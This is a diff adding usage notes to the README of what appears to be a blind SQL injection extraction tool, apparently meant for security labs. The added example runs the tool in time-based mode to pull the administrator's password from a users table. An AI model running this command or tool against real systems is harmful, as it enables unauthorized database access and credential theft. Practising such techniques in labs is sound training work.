@@ -14,6 +14,7 @@ oracle type, and the backend DBMS.
 
 <img width="2000" height="3000" alt="image" src="https://github.com/user-attachments/assets/af323c1d-0d1e-4d2a-a880-f44b7f1ad8fb" />
 
+---
 
 ## Table of contents
 
@@ -339,6 +340,17 @@ python3 blind_sqli_extract.py --req request.txt --https --auto --mode auto --con
 | `--delay S` | Seconds a TRUE condition sleeps in time mode (default 3). |
 | `--timeout S` | Per-request timeout (default 15; raise above `--delay`). |
 | `--max-len N` | Max characters/length to probe (default 64). |
+
+**Discovery vs. speed:** use bare `--auto` to *discover* the schema (what tables
+and columns exist). Once you know the target, a **targeted `--query` is far
+faster** than dumping — it puts all threads on one value's characters:
+
+```bash
+# fastest way to grab one known value in time mode (~40s vs minutes)
+./blind_sqli_extract.py --req req.txt --https --mode time --dbms mysql \
+    --charset loweralnum \
+    --query "SELECT password FROM users WHERE username='administrator'"
+```
 
 **Speed tips (especially for time-based labs, which are inherently slow):**
 
